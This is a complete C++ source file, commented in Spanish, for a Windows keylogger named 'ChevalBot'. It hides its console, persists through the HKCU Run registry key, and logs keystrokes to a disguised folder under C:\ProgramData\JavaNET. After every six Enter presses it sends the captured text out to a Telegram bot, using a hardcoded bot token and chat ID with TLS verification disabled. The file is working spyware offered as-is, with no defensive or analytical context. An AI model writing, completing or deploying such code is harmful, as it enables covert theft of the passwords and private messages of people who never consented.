#define CURL_STATICLIB
#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <curl/curl.h>
#include <vector>
#include <algorithm>

using namespace std;

// Prototipos de funciones
void registrar(CURL* curl);
void background();
size_t WriteCallback(void* contents, size_t size, size_t nmemb, string* userp);
void configurarAutoInicio();
bool enviarPorTelegram(CURL* curl, const string& rutaArchivo);

// Variables globales para el control de archivos
int contadorEnter = 0;
int numeroArchivo = 1;

// ===== CREDENCIALES =====
const string TELEGRAM_BOT_TOKEN = "8867823241:AAFAD_s14tlZdXrQuYrOQGCrJarmgRXD8jE";
const string TELEGRAM_CHAT_ID = "7847094240";

int main()
{
    // 1. Inicializar el entorno global de libcurl
    curl_global_init(CURL_GLOBAL_ALL);
    
    // 2. Inicializar la sesión HTTP persistente (EVITA EL ERROR DE URL)
    CURL* curlPersistente = curl_easy_init();
    
    if (!curlPersistente) {
        cout << "[ERROR] No se pudo inicializar libcurl." << endl;
        curl_global_cleanup();
        return 1;
    }

    configurarAutoInicio();

    // Comentado temporalmente para ver la terminal en VS Code
    background(); 
    
    // 3. Pasar la sesion a la función encargada de capturar teclas
    registrar(curlPersistente);
    
    // 4. Limpiar correctamente al cerrar
    curl_easy_cleanup(curlPersistente);
    curl_global_cleanup();

    return 0;
}

void background()
{
    HWND silenceWindow;
    AllocConsole();
    silenceWindow = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(silenceWindow, 0);
}


size_t WriteCallback(void* contents, size_t size, size_t nmemb, string* userp) {
    userp->append((char*)contents, size * nmemb);
    return size * nmemb;
}

void configurarAutoInicio() {
    char rutaExe[MAX_PATH];
    GetModuleFileNameA(NULL, rutaExe, MAX_PATH);

    HKEY hKey;
    LONG resultado = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    
    if (resultado == ERROR_SUCCESS) {
        // Guarda el ejecutable en el inicio del usuario actual con el nombre "ChevalBot"
        RegSetValueExA(hKey, "ChevalBot", 0, REG_SZ, (const BYTE*)rutaExe, strlen(rutaExe) + 1);
        RegCloseKey(hKey);
    }    
}

bool enviarPorTelegram(CURL* curl, const string& rutaArchivo) {
    if (!curl) return false;
    
    CURLcode res = CURLE_OK;
    bool exito = false;
    
    // Resetear la sesion anterior para eliminar basura de la URL o cabeceras
    curl_easy_reset(curl);
    
    // Leer el archivo .txt
    ifstream archivo(rutaArchivo);
    if (!archivo.is_open()) {
        cout << "[ERROR] No se pudo abrir el archivo para leer: " << rutaArchivo << endl;
        return false;
    }
    
    string contenido((istreambuf_iterator<char>(archivo)), istreambuf_iterator<char>());
    archivo.close();
    
    string mensaje = "Keylogger Report - File: " + rutaArchivo + "\n\nContenido:\n" + contenido;
    
    // Dirección fija de la API de Telegram
    string url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
    
    // Codificar de forma segura el mensaje
    char* mensaje_codificado = curl_easy_escape(curl, mensaje.c_str(), static_cast<int>(mensaje.length()));

    string post_fields = "chat_id=" + TELEGRAM_CHAT_ID + "&text=" + string(mensaje_codificado);

    string respuestaServidor;

    // Configuración limpia sobre el puntero seguro
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields.c_str());
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    
    // Ignorar problemas de SSL locales en Windows
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    // Captura de datos
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &respuestaServidor);
    
    res = curl_easy_perform(curl);
    
    cout << "\n========== DIAGNOSTICO TELEGRAM ==========" << endl;
    if (res != CURLE_OK) {
        cout << "[CURL ERROR] Fallo de red: " << curl_easy_strerror(res) << endl;
    } else {
        long http_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
        cout << "[HTTP CODE]: " << http_code << endl;
        cout << "[RESPUESTA TELEGRAM]: " << respuestaServidor << endl;
        
        if (http_code == 200) {
            exito = true;
        }
    }
    cout << "==========================================\n" << endl;
    
    curl_free(mensaje_codificado);
    return exito;
}

void registrar(CURL* curl)
{
    int tecla;
    ofstream saveKey;

    for (;;)
    {
        for (tecla = 8; tecla <= 255; tecla++)
        {
            if (GetAsyncKeyState(tecla) == -32767)
            {
                // Detectar estados de las teclas de control y combinación (Alt Gr y Ctrl)
                bool altGrPresionado = (GetAsyncKeyState(VK_RMENU) & 0x8000) != 0;
                bool ctrlPresionado = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
                bool altIzquierdoPresionado = (GetAsyncKeyState(VK_LMENU) & 0x8000) != 0;
                bool combinacionEspecial = altGrPresionado || (ctrlPresionado && altIzquierdoPresionado);

                // ===== CASO ESPECIAL 1: ARROBA con (Alt Gr + Q) =====
                if ((tecla == 'Q' || tecla == 'q') && combinacionEspecial) {
                    string rutaArchivo = "C:\\ProgramData\\JavaNET\\pulsaciones_" + to_string(numeroArchivo) + ".txt";
                    saveKey.open(rutaArchivo, ios::app);
                    if (saveKey.is_open()) {
                        saveKey << "@";
                        saveKey.close();
                    }
                    continue;
                }

                // ===== CASO ESPECIAL 2: ARROBA (Alt Gr + 2 / Ctrl + Alt + 2) =====
                // El codigo numerico virtual de la tecla 2 es el 50
                if (tecla == 50 && combinacionEspecial) {
                    string rutaArchivo = "C:\\ProgramData\\JavaNET\\pulsaciones_" + to_string(numeroArchivo) + ".txt";
                    saveKey.open(rutaArchivo, ios::app);
                    if (saveKey.is_open()) {
                        saveKey << "@";
                        saveKey.close();
                    }
                    continue; // Saltamos el resto para evitar escribir el '2' o las comillas '"'
                }

                // ===== 1. FILTRAR SISTEMA (Excepto cuando se busca la arroba) =====
                if (tecla == VK_CONTROL || tecla == VK_MENU || tecla == 91 || tecla == 92 || tecla == VK_CAPITAL) {
                    continue; 
                }

                if (tecla >= VK_PRIOR && tecla <= VK_DOWN) continue; //<-- felchas
                if (tecla >= VK_F1 && tecla <= VK_F12) continue; // <--F1 hasta el F12
                if (tecla == VK_DELETE || tecla == VK_INSERT) continue; // <-- Delete e insert

                string rutaArchivo = "C:\\ProgramData\\JavaNET\\pulsaciones_" + to_string(numeroArchivo) + ".txt";
                
                // ===== 2. MANEJO CORRECTO DEL BACKSPACE =====
                if (tecla == VK_BACK) {
                    ifstream archivoLectura(rutaArchivo);
                    string contenidoPrevio = "";
                    if (archivoLectura.is_open()) {
                        contenidoPrevio = string((istreambuf_iterator<char>(archivoLectura)), istreambuf_iterator<char>());
                        archivoLectura.close();
                    }
                    if (!contenidoPrevio.empty()) {
                        contenidoPrevio.pop_back(); 
                        saveKey.open(rutaArchivo, ios::trunc);
                        if (saveKey.is_open()) {
                            saveKey << contenidoPrevio;
                            saveKey.close();
                        }
                    }
                    continue;
                }

                // Abrir archivo para escritura normal
                saveKey.open(rutaArchivo, ios::app);
                if (!saveKey.is_open()) {
                    CreateDirectory("C:\\ProgramData\\JavaNET", NULL);
                    saveKey.open(rutaArchivo, ios::app);
                    if (!saveKey.is_open()) continue;
                }

                bool shiftPresionado = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

                // ===== 3. MAPEO DE LETRAS =====
                if ((tecla > 64) && (tecla < 91)) {
                    if (!shiftPresionado) {
                        tecla += 32; 
                    }
                    saveKey << (char)tecla;
                }
                // ===== 4. MAPEO TECLADO LATINOAMerica (PE) =====
                else {
                    switch (tecla) {
                        case 48: saveKey << (shiftPresionado ? "=" : "0"); break;
                        case 49: saveKey << (shiftPresionado ? "!" : "1"); break;
                        case 50: saveKey << (shiftPresionado ? "\"" : "2"); break;
                        case 51: saveKey << (shiftPresionado ? "#" : "3"); break;
                        case 52: saveKey << (shiftPresionado ? "$" : "4"); break;
                        case 53: saveKey << (shiftPresionado ? "%" : "5"); break;
                        case 54: saveKey << (shiftPresionado ? "&" : "6"); break;
                        case 55: saveKey << (shiftPresionado ? "/" : "7"); break;
                        case 56: saveKey << (shiftPresionado ? "(" : "8"); break;
                        case 57: saveKey << (shiftPresionado ? ")" : "9"); break;
                        
                        case VK_SPACE:  saveKey << " "; break;
                        case VK_TAB:    saveKey << "    "; break;
                        case VK_ESCAPE: saveKey << "<Esc>"; break;

                        case 188: saveKey << (shiftPresionado ? ";" : ","); break; 
                        case 190: saveKey << (shiftPresionado ? ":" : "."); break; 
                        case 189: saveKey << (shiftPresionado ? "_" : "-"); break; 

                        case 192: saveKey << (shiftPresionado ? "Ñ" : "ñ"); break; 
                        case 219: saveKey << (shiftPresionado ? "?" : "'"); break; 
                        case 220: saveKey << (shiftPresionado ? "¿" : "¡"); break;
                        case 186: saveKey << (shiftPresionado ? "^" : "`"); break; 
                        case 187: saveKey << (shiftPresionado ? "+" : "*"); break; 
                        case 222: saveKey << (shiftPresionado ? "{" : "["); break; 
                        case 221: saveKey << (shiftPresionado ? "}" : "]"); break; 
                        case 226: saveKey << (shiftPresionado ? ">" : "<"); break;

                        case VK_RETURN:
                            saveKey << "\n";
                            contadorEnter++;
                            if (contadorEnter >= 6) {
                                saveKey.close(); 
                                
                                string archivoAEnviar = "C:\\ProgramData\\JavaNET\\pulsaciones_" + to_string(numeroArchivo) + ".txt";
                                enviarPorTelegram(curl, archivoAEnviar); 
                                
                                numeroArchivo++;
                                contadorEnter = 0;
                                
                                string nuevaRuta = "C:\\ProgramData\\JavaNET\\pulsaciones_" + to_string(numeroArchivo) + ".txt";
                                saveKey.open(nuevaRuta, ios::app);
                                if (!saveKey.is_open()) {
                                    CreateDirectory("C:\\ProgramData\\JavaNET", NULL);
                                    saveKey.open(nuevaRuta, ios::app);
                                }
                            }
                            break;
                    }
                }
                saveKey.close();
                break;
            }
        }
        Sleep(10);
    }
}

